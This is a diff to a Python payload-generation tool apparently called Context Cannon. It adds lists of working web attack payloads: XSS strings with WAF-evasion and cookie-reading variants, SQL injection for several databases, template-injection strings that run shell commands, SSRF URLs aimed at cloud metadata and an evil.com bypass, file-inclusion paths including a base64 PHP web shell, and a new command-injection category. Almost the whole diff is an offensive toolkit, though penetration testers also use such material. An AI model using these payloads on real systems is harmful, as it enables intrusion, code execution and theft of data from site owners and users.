@@ -64,6 +64,15 @@ class ContextCannon:
                     '<marquee onstart=alert(1)>',
                     '<details open ontoggle=alert(1)>',
                     '<video><source onerror=alert(1)>',
+                    '<iframe src="javascript:alert(1)">',
+                    '<object data="javascript:alert(1)">',
+                ],
+                'dom': [
+                    'javascript:alert(1)',
+                    'jaVaScRiPt:alert(1)',
+                    'javascript:alert(document.domain)',
+                    '#<img src=x onerror=alert(1)>',
+                    '"><img src=x onerror=alert(document.cookie)>',
                 ],
                 'no_script': [
                     '<img src=x onerror=alert(1)>',
@@ -76,29 +85,38 @@ class ContextCannon:
                     '<script>alert`1`</script>',
                     '<img src=x onerror=alert`1`>',
                     '<script>onerror=alert;throw 1</script>',
+                    '<script>throw onerror=alert,1</script>',
+                    '<script>{onerror=alert}throw 1</script>',
                 ],
                 'attribute_double': [
                     '" onmouseover="alert(1)',
                     '" onfocus="alert(1)" autofocus="',
                     '"><script>alert(1)</script>',
                     '"><img src=x onerror=alert(1)>',
+                    '" accesskey="x" onclick="alert(1)',
                 ],
                 'attribute_single': [
                     "' onmouseover='alert(1)",
                     "' onfocus='alert(1)' autofocus='",
                     "'><script>alert(1)</script>",
+                    "' accesskey='x' onclick='alert(1)",
                 ],
                 'javascript': [
                     "'-alert(1)-'",
                     "';alert(1)//",
                     '"-alert(1)-"',
                     '";alert(1)//',
+                    "\\';alert(1)//",
+                    '</script><script>alert(1)</script>',
                 ],
                 'waf_bypass': [
                     '<svg/onload=alert(1)>',
                     '<svg\tonload=alert(1)>',
                     '<ScRiPt>alert(1)</sCrIpT>',
                     '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>',
+                    '<svg onload=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>',
+                    '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
+                    '<svg/onload=self["ale"+"rt"](1)>',
                 ],
             },
             'sqli': {
@@ -106,6 +124,7 @@ class ContextCannon:
                     "'", "''", "' OR '1'='1", "' OR '1'='1'--",
                     '" OR "1"="1', "1' AND '1'='1", "1' AND '1'='2",
                     "1 AND 1=1", "1 AND 1=2", "' ORDER BY 1--",
+                    "' OR 1=1#", "admin'--",
                 ],
                 'mysql': [
                     "' UNION SELECT NULL--",
@@ -113,21 +132,38 @@ class ContextCannon:
                     "' UNION SELECT @@version--",
                     "' AND SLEEP(5)--",
                     "' AND extractvalue(1,concat(0x7e,version()))--",
+                    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+                    "' UNION SELECT table_name,NULL FROM information_schema.tables--",
                 ],
                 'postgres': [
                     "' UNION SELECT NULL--",
                     "' UNION SELECT version()--",
                     "'; SELECT pg_sleep(5)--",
+                    "' UNION SELECT table_name,NULL FROM information_schema.tables--",
                 ],
                 'mssql': [
                     "' UNION SELECT NULL--",
                     "' UNION SELECT @@version--",
                     "'; WAITFOR DELAY '0:0:5'--",
+                    "' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'--",
+                ],
+                'sqlite': [
+                    "' UNION SELECT sqlite_version()--",
+                    "' UNION SELECT sql FROM sqlite_master--",
+                    "' UNION SELECT name FROM sqlite_master WHERE type='table'--",
+                ],
+                'blind': [
+                    "' AND 1=1--",
+                    "' AND 1=2--",
+                    "' AND SUBSTRING(@@version,1,1)='5'--",
+                    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
+                    "' OR IF(1=1,SLEEP(5),0)--",
                 ],
                 'bypass': [
                     "'/**/OR/**/1=1--",
                     "' uNiOn SeLeCt NULL--",
                     "%27%20OR%201=1--",
+                    "' /*!50000UNION*/ SELECT NULL--",
                 ],
             },
             'ssti': {
@@ -139,9 +175,12 @@ class ContextCannon:
                     '{{config}}',
                     "{{''.__class__.__mro__[1].__subclasses__()}}",
                     '{{lipsum.__globals__["os"].popen("id").read()}}',
+                    '{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}',
+                    '{{cycler.__init__.__globals__.os.popen("id").read()}}',
                 ],
                 'twig': [
                     '{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}',
+                    '{{["id"]|map("system")|join(",")}}',
                 ],
                 'erb': [
                     '<%= system("id") %>',
@@ -154,12 +193,16 @@ class ContextCannon:
                 'freemarker': [
                     '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
                 ],
+                'mako': [
+                    '${__import__("os").popen("id").read()}',
+                ],
             },
             'ssrf': {
                 'localhost': [
                     'http://127.0.0.1', 'http://localhost',
                     'http://127.1', 'http://[::1]',
                     'http://2130706433', 'http://0x7f000001',
+                    'http://0.0.0.0', 'http://[0:0:0:0:0:ffff:127.0.0.1]',
                 ],
                 'cloud_meta': [
                     'http://169.254.169.254/latest/meta-data/',
@@ -167,6 +210,7 @@ class ContextCannon:
                     'http://metadata.google.internal/computeMetadata/v1/',
                     'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
                     'http://100.100.100.200/latest/meta-data/',
+                    'http://169.254.169.254/latest/user-data/',
                 ],
                 'bypass': [
                     'http://127.0.0.1.nip.io',
@@ -174,6 +218,8 @@ class ContextCannon:
                     'http://spoofed.burpcollaborator.net',
                     'http://0177.0.0.1',
                     'http://0x7f.0x0.0x0.0x1',
+                    'http://127.1.1.1:80@127.0.0.1/',
+                    'http://127.0.0.1#@evil.com/',
                 ],
             },
             'lfi': {
@@ -181,13 +227,40 @@ class ContextCannon:
                     '../../../etc/passwd',
                     '....//....//....//etc/passwd',
                     '..%2f..%2f..%2fetc/passwd',
+                    '..%252f..%252f..%252fetc/passwd',
                 ],
                 'windows': [
                     '..\\..\\..\\windows\\win.ini',
+                    '..%5c..%5c..%5cwindows%5cwin.ini',
                 ],
                 'wrapper': [
                     'php://filter/convert.base64-encode/resource=index.php',
                     'php://input',
+                    'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=',
+                    'expect://id',
+                ],
+                'log_poison': [
+                    '/var/log/apache2/access.log',
+                    '/var/log/nginx/access.log',
+                    '/proc/self/environ',
+                ],
+            },
+            'cmdi': {
+                'basic': [
+                    '; id', '| id', '`id`', '$(id)',
+                    '& id', '&& id', '|| id',
+                ],
+                'blind': [
+                    '; sleep 5', '| sleep 5', '`sleep 5`',
+                    '$(sleep 5)', '& sleep 5 &',
+                ],
+                'windows': [
+                    '& whoami', '| whoami', '&& whoami',
+                    '& ping -n 5 127.0.0.1',
+                ],
+                'bypass': [
+                    ";$IFS'id'", "c'a't /etc/passwd",
+                    '${IFS}id', "w`echo h`oami",
                 ],
             },
         }
@@ -247,7 +320,7 @@ class ContextCannon:
 def main():
     parser = argparse.ArgumentParser(description='Context Cannon - Smart Payload Generation')
     parser.add_argument('-V', '--version', action='version', version=f'context-cannon {__version__}')
-    parser.add_argument('-t', '--type', choices=['xss', 'sqli', 'ssti', 'ssrf', 'lfi'],
+    parser.add_argument('-t', '--type', choices=['xss', 'sqli', 'ssti', 'ssrf', 'lfi', 'cmdi'],
                         help='Vulnerability type')
     parser.add_argument('-c', '--context', help='Specific context')
     parser.add_argument('--filter', help='Blocked strings to avoid (comma-separated)')
